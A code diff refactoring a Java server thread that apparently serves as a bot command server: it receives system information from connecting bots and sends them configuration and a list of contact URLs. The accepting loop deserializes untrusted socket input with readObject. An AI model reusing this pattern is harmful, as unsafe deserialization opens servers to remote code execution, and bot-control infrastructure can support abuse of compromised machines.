@@ -18,15 +18,15 @@ import model.URLEntry;
  */
 public class SocketBotServerThread extends Thread{
 
-	ProgramLog programLog;
-	ServerSocket serverSocket;
-	Socket connectionSocket;
-	ObjectOutputStream outToClient;
-    ObjectInputStream inFromClient;				
+	private ProgramLog programLog;
+	private ServerSocket serverSocket;
+	private Socket connectionSocket;
+	private ConfigHeader outConfigHeader;
+	private ArrayList<URLEntry> outContactList;
+	private ArrayList<SystemInfoEntry> inSystemInfo;
+	private ObjectOutputStream outToClient;
+	private  ObjectInputStream inFromClient;				
 
-	ConfigHeader outConfigHeader;
-	ArrayList<URLEntry> outContactList;
-	ArrayList<SystemInfoEntry> inSystemInfo;
 	
 	/**
 	 * Il metodo run() contiene un ciclo senza fine nel quale
@@ -47,16 +47,15 @@ public class SocketBotServerThread extends Thread{
 		}
 		
 		while (true) {
-			try {
-
-				programLog.addInfo("Waiting for request");
-				
+			try {				
 				connectionSocket = serverSocket.accept();
-				programLog.addInfo("Accepted request");
 				outToClient = new ObjectOutputStream(connectionSocket.getOutputStream());
 	            inFromClient = new ObjectInputStream(connectionSocket.getInputStream());				
 
 	            inSystemInfo = (ArrayList<SystemInfoEntry>) inFromClient.readObject();		  
+	            
+	            programLog.addInfo("Accepted request from Bot: " + inSystemInfo.get(0).getValue());
+
 	            
 	            Main.botServer.addSystemInfo(inSystemInfo);
 	            outConfigHeader = Main.botServer.getConfig().getConfigHeader();
